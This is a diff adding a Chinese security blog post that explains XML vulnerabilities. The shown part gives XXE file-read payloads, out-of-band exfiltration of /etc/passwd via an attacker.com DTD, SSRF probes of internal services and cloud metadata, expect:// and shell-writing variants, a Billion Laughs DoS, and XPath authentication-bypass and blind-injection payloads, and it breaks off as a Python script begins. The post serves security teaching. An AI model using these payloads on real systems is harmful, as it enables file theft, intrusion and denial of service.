@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>My Blog · XML 漏洞全解：XXE、XPath 注入与 XML 外部实体</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Ma+Shan+Zheng&family=Noto+Serif+SC:wght@400;700;900&display=swap" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 8.1.2"></head>
+<body>
+
+  <!-- 星空 -->
+  <canvas id="stars-canvas"></canvas>
+
+  <!-- 薄雾 -->
+  <div class="mist-layer">
+    <div class="mist"></div><div class="mist"></div><div class="mist"></div>
+  </div>
+
+  <!-- 花瓣 -->
+  <div class="petal-container" id="petalContainer"></div>
+
+  <!-- 导航 -->
+  <nav id="navbar">
+    <div class="nav-container">
+      <a href="/" class="logo">My Blog</a>
+      <div class="nav-links">
+        <a href="/">首页</a>
+        <a href="/archives">文章</a>
+        <a href="/about">关于</a>
+      </div>
+    </div>
+  </nav>
+
+  <!-- 内容 -->
+  <main class="content-layer">
+    <section class="section-container" style="padding-top: 140px;">
+  <article class="post-card">
+    <h1 class="post-title">XML 漏洞全解：XXE、XPath 注入与 XML 外部实体</h1>
+    <div class="post-meta">
+      <span>2026-06-24</span>
+      
+        <span style="margin-left: 16px;color:rgba(201,169,110,0.6);">XML · XXE · XPath · 注入 · 文件读取</span>
+      
+    </div>
+    <div class="post-content">
+      <h1 id="XML-漏洞全解：XXE、XPath-注入与-XML-外部实体"><a href="#XML-漏洞全解：XXE、XPath-注入与-XML-外部实体" class="headerlink" title="XML 漏洞全解：XXE、XPath 注入与 XML 外部实体"></a>XML 漏洞全解：XXE、XPath 注入与 XML 外部实体</h1><blockquote>
+<p>系统化拆解 XML 相关漏洞的原理、利用与防御</p>
+</blockquote>
+<hr>
+<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
+<li><a href="#%E7%AC%AC1%E7%AB%A0-xml-%E5%9F%BA%E7%A1%80">第1章 XML 基础</a></li>
+<li><a href="#%E7%AC%AC2%E7%AB%A0-xxe--xml-%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5">第2章 XXE — XML 外部实体注入</a></li>
+<li><a href="#%E7%AC%AC3%E7%AB%A0-xpath-%E6%B3%A8%E5%85%A5">第3章 XPath 注入</a></li>
+<li><a href="#%E7%AC%AC4%E7%AB%A0-xml-%E6%B3%A8%E5%85%A5">第4章 XML 注入</a></li>
+<li><a href="#%E7%AC%AC5%E7%AB%A0-%E9%98%B2%E5%BE%A1%E4%B8%8E%E4%BF%AE%E5%A4%8D">第5章 防御与修复</a></li>
+</ul>
+<hr>
+<h2 id="第1章-XML-基础"><a href="#第1章-XML-基础" class="headerlink" title="第1章 XML 基础"></a>第1章 XML 基础</h2><h3 id="1-1-什么是-XML"><a href="#1-1-什么是-XML" class="headerlink" title="1.1 什么是 XML"></a>1.1 什么是 XML</h3><p>XML（Extensible Markup Language）是一种标记语言，用于存储和传输数据。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span> <span class="attr">id</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span> <span class="attr">id</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>guest<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>guest<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-XML-的四个关键概念"><a href="#1-2-XML-的四个关键概念" class="headerlink" title="1.2 XML 的四个关键概念"></a>1.2 XML 的四个关键概念</h3><table>
+<thead>
+<tr>
+<th>概念</th>
+<th>说明</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>标签</strong></td>
+<td>数据的标记</td>
+<td><code>&lt;user&gt;</code>、<code>&lt;/user&gt;</code></td>
+</tr>
+<tr>
+<td><strong>属性</strong></td>
+<td>标签的附加信息</td>
+<td><code>id=&quot;1&quot;</code></td>
+</tr>
+<tr>
+<td><strong>实体</strong></td>
+<td>变量的占位符</td>
+<td><code>&amp;lt;</code> 表示 <code>&lt;</code></td>
+</tr>
+<tr>
+<td><strong>DTD</strong></td>
+<td>文档类型定义</td>
+<td><code>&lt;!DOCTYPE ...&gt;</code></td>
+</tr>
+</tbody></table>
+<h3 id="1-3-DTD-—-文档类型定义"><a href="#1-3-DTD-—-文档类型定义" class="headerlink" title="1.3 DTD — 文档类型定义"></a>1.3 DTD — 文档类型定义</h3><p>DTD 是用来定义 XML 文档结构的规则，同时也是 <strong>XXE 漏洞的根源</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ELEMENT foo ANY&gt;</span><br><span class="line">    &lt;!ENTITY xxe &quot;这是一个实体&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>DTD 中可以定义：</p>
+<ul>
+<li><strong>内部实体</strong>：<code>&lt;!ENTITY name &quot;value&quot;&gt;</code></li>
+<li><strong>外部实体</strong>：<code>&lt;!ENTITY name SYSTEM &quot;URL&quot;&gt;</code>  ← 这就是 XXE 的入口</li>
+<li><strong>参数实体</strong>：<code>&lt;!ENTITY % name &quot;value&quot;&gt;</code></li>
+</ul>
+<hr>
+<h2 id="第2章-XXE-—-XML-外部实体注入"><a href="#第2章-XXE-—-XML-外部实体注入" class="headerlink" title="第2章 XXE — XML 外部实体注入"></a>第2章 XXE — XML 外部实体注入</h2><h3 id="2-1-什么是-XXE"><a href="#2-1-什么是-XXE" class="headerlink" title="2.1 什么是 XXE"></a>2.1 什么是 XXE</h3><p>XXE（XML External Entity Injection）攻击者利用 XML 解析器对外部实体的支持，读取本地文件、发起 SSRF 请求或执行 DoS 攻击。</p>
+<p><strong>漏洞根因</strong>：XML 解析器在解析 DTD 时，<code>SYSTEM</code> 关键字允许从外部 URL 或本地文件加载内容。</p>
+<h3 id="2-2-XXE-读文件（核心场景）"><a href="#2-2-XXE-读文件（核心场景）" class="headerlink" title="2.2 XXE 读文件（核心场景）"></a>2.2 XXE 读文件（核心场景）</h3><h4 id="基本-Payload"><a href="#基本-Payload" class="headerlink" title="基本 Payload"></a>基本 Payload</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>执行流程</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">解析器读到 &amp;xxe; → 查找实体定义 → 发现 SYSTEM &quot;file:///etc/passwd&quot;</span><br><span class="line">                                      → 读取 /etc/passwd 文件内容</span><br><span class="line">                                      → 替换 &amp;xxe; 为文件内容</span><br><span class="line">                                      → 服务器返回文件内容</span><br></pre></td></tr></table></figure>
+
+<h4 id="读-PHP-文件（Base64-编码绕过）"><a href="#读-PHP-文件（Base64-编码绕过）" class="headerlink" title="读 PHP 文件（Base64 编码绕过）"></a>读 PHP 文件（Base64 编码绕过）</h4><p>对于 PHP 环境，直接读 PHP 文件会被解析执行，需要用 Base64 编码：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=index.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3-XXE-的三种类型"><a href="#2-3-XXE-的三种类型" class="headerlink" title="2.3 XXE 的三种类型"></a>2.3 XXE 的三种类型</h3><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>说明</th>
+<th>利用方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>有回显 XXE</strong></td>
+<td>文件内容在响应中返回</td>
+<td>直接替换实体即可</td>
+</tr>
+<tr>
+<td><strong>无回显 XXE</strong></td>
+<td>文件内容不直接返回</td>
+<td>带外（OOB）外带</td>
+</tr>
+<tr>
+<td><strong>错误 XXE</strong></td>
+<td>通过错误信息读取内容</td>
+<td>构造语法错误让内容出现在错误消息中</td>
+</tr>
+</tbody></table>
+<h3 id="2-4-无回显-XXE（OOB-—-Out-of-Band）"><a href="#2-4-无回显-XXE（OOB-—-Out-of-Band）" class="headerlink" title="2.4 无回显 XXE（OOB — Out-of-Band）"></a>2.4 无回显 XXE（OOB — Out-of-Band）</h3><p>当页面不返回解析结果时，需要通过 HTTP 请求把数据带出来：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">callhome</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/?data=%xxe;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %callhome;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>test<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>但是参数实体中不能引用另一个参数实体（某些解析器限制）。需要用 <strong>嵌套 DTD</strong>：</p>
+<p><strong>第一步：攻击者服务器放一个 dtd 文件（evil.dtd）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;http://attacker.com/?data=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfil;</span><br></pre></td></tr></table></figure>
+
+<p><strong>第二步：Payload 引用外部 DTD</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %remote;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>test<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>执行流程</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">服务器请求 evil.dtd → 解析 %remote;</span><br><span class="line">    → 定义 %file（读 /etc/passwd）</span><br><span class="line">    → 定义 %eval（动态构造 exfil 实体）</span><br><span class="line">    → 调用 %exfil → 向攻击者服务器发送 /etc/passwd 内容</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-5-XXE-→-SSRF"><a href="#2-5-XXE-→-SSRF" class="headerlink" title="2.5 XXE → SSRF"></a>2.5 XXE → SSRF</h3><p>XXE 不仅可以读文件，还可以向内部服务发请求：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://127.0.0.1:6379/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>常用内网探测目标</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>服务</th>
+<th>默认端口</th>
+<th>Payload</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Redis</td>
+<td>6379</td>
+<td><code>http://127.0.0.1:6379/</code></td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td>3306</td>
+<td><code>http://127.0.0.1:3306/</code></td>
+</tr>
+<tr>
+<td>Elasticsearch</td>
+<td>9200</td>
+<td><code>http://127.0.0.1:9200/</code></td>
+</tr>
+<tr>
+<td>Docker API</td>
+<td>2375</td>
+<td><code>http://127.0.0.1:2375/version</code></td>
+</tr>
+<tr>
+<td>Kubernetes API</td>
+<td>6443</td>
+<td><code>https://127.0.0.1:6443/</code></td>
+</tr>
+<tr>
+<td>AWS Metadata</td>
+<td>—</td>
+<td><code>http://169.254.169.254/latest/meta-data/</code></td>
+</tr>
+</tbody></table>
+<h3 id="2-6-XXE-→-RCE"><a href="#2-6-XXE-→-RCE" class="headerlink" title="2.6 XXE → RCE"></a>2.6 XXE → RCE</h3><h4 id="PHP-环境：expect-协议"><a href="#PHP-环境：expect-协议" class="headerlink" title="PHP 环境：expect:// 协议"></a>PHP 环境：<code>expect://</code> 协议</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;expect://id&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>需要 PHP 安装了 <code>expect</code> 扩展。</p>
+<h4 id="PHP-环境：php-input-写文件"><a href="#PHP-环境：php-input-写文件" class="headerlink" title="PHP 环境：php://input 写文件"></a>PHP 环境：<code>php://input</code> 写文件</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/write=convert.base64-decode/resource=shell.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Java-环境：通过-SSRF-反序列化-RCE"><a href="#Java-环境：通过-SSRF-反序列化-RCE" class="headerlink" title="Java 环境：通过 SSRF + 反序列化 RCE"></a>Java 环境：通过 SSRF + 反序列化 RCE</h4><p>Java 中的 XXE 一般不能直接 RCE，需要结合 SSRF 打到内网的 Java 反序列化接口。</p>
+<h3 id="2-7-XXE-DoS（Billion-Laughs-攻击）"><a href="#2-7-XXE-DoS（Billion-Laughs-攻击）" class="headerlink" title="2.7 XXE DoS（Billion Laughs 攻击）"></a>2.7 XXE DoS（Billion Laughs 攻击）</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">lolz</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">lol</span> <span class="string">&quot;lol&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">lol2</span> <span class="string">&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">lol3</span> <span class="string">&quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">lol4</span> <span class="string">&quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">lol5</span> <span class="string">&quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">lol6</span> <span class="string">&quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">lol7</span> <span class="string">&quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">lol8</span> <span class="string">&quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">lol9</span> <span class="string">&quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;lol9;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>lol9</code> 展开后约为 <strong>3GB</strong> 文本，直接耗尽服务器内存。</p>
+<hr>
+<h2 id="第3章-XPath-注入"><a href="#第3章-XPath-注入" class="headerlink" title="第3章 XPath 注入"></a>第3章 XPath 注入</h2><h3 id="3-1-什么是-XPath"><a href="#3-1-什么是-XPath" class="headerlink" title="3.1 什么是 XPath"></a>3.1 什么是 XPath</h3><p>XPath 是一种在 XML 文档中查找信息的语言，类似于 SQL 的查询语法：</p>
+<figure class="highlight xpath"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/users/user<span class="built_in">[name</span>=<span class="string">&#x27;admin&#x27;</span>]/password</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-漏洞原理"><a href="#3-2-漏洞原理" class="headerlink" title="3.2 漏洞原理"></a>3.2 漏洞原理</h3><p>当用户输入直接拼接到 XPath 查询字符串中时，可以注入 XPath 语法改变查询逻辑。</p>
+<p><strong>漏洞代码示例</strong>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];  <span class="comment">// 用户输入直接拼接</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;/users/user[name=&#x27;<span class="subst">$name</span>&#x27;]/password&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">xpath_eval</span>(<span class="variable">$xml</span>, <span class="variable">$query</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-3-XPath-注入与-SQL-注入的对比"><a href="#3-3-XPath-注入与-SQL-注入的对比" class="headerlink" title="3.3 XPath 注入与 SQL 注入的对比"></a>3.3 XPath 注入与 SQL 注入的对比</h3><table>
+<thead>
+<tr>
+<th>对比项</th>
+<th>SQL 注入</th>
+<th>XPath 注入</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>查询语言</td>
+<td>SQL</td>
+<td>XPath</td>
+</tr>
+<tr>
+<td>有无注释符</td>
+<td><code>--</code>、<code>#</code></td>
+<td>无注释符，但有 <code>parent::</code>、<code>/..</code></td>
+</tr>
+<tr>
+<td>UNION</td>
+<td>支持</td>
+<td>不支持</td>
+</tr>
+<tr>
+<td>堆叠查询</td>
+<td>部分支持</td>
+<td>不支持</td>
+</tr>
+<tr>
+<td>绕过认证</td>
+<td><code>&#39; OR &#39;1&#39;=&#39;1</code></td>
+<td><code>&#39; or &#39;1&#39;=&#39;1</code></td>
+</tr>
+<tr>
+<td>返回值数量</td>
+<td>一条记录</td>
+<td>所有匹配节点</td>
+</tr>
+</tbody></table>
+<h3 id="3-4-常用-Payload"><a href="#3-4-常用-Payload" class="headerlink" title="3.4 常用 Payload"></a>3.4 常用 Payload</h3><h4 id="绕过认证"><a href="#绕过认证" class="headerlink" title="绕过认证"></a>绕过认证</h4><figure class="highlight xpath"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="string">&#x27; or true() or &#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="盲注-—-猜解节点名"><a href="#盲注-—-猜解节点名" class="headerlink" title="盲注 — 猜解节点名"></a>盲注 — 猜解节点名</h4><figure class="highlight xpath"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and string-length(name(/*[1]))&gt;4 and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="盲注-—-猜解节点值长度"><a href="#盲注-—-猜解节点值长度" class="headerlink" title="盲注 — 猜解节点值长度"></a>盲注 — 猜解节点值长度</h4><figure class="highlight xpath"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and string-length(//user[1]/password/text())&gt;8 and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="盲注-—-逐字符猜解"><a href="#盲注-—-逐字符猜解" class="headerlink" title="盲注 — 逐字符猜解"></a>盲注 — 逐字符猜解</h4><figure class="highlight xpath"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and substring(//user[1]/password/text(),1,1)=&#x27;</span>a<span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="string">&#x27; and substring(//user[1]/password/text(),1,1)=&#x27;</span>b<span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="读取所有数据（盲注场景）"><a href="#读取所有数据（盲注场景）" class="headerlink" title="读取所有数据（盲注场景）"></a>读取所有数据（盲注场景）</h4><figure class="highlight xpath"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27;] | //* | /foo[bar=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-5-盲注脚本模板"><a href="#3-5-盲注脚本模板" class="headerlink" title="3.5 盲注脚本模板"></a>3.5 盲注脚本模板</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">XPath 盲注脚本 — 